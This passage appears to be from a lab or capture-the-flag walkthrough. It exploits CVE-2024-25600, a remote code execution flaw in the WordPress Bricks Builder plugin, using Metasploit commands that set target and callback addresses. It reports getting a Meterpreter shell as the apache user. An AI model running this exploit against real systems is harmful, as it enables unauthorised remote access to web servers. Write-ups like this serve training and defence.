## 🚪 Phase 2: Exploitation & Initial Access

### Exploiting CVE-2024-25600 (RCE)

```bash
use exploit/multi/http/wp_bricks_builder_rce
set RHOSTS MACHINE_IP
set LHOST YOUR_IP
set SSL true
set RPORT 443
exploit
```

**Result:**

  * Meterpreter session established.
  * Access gained as `apache` user.

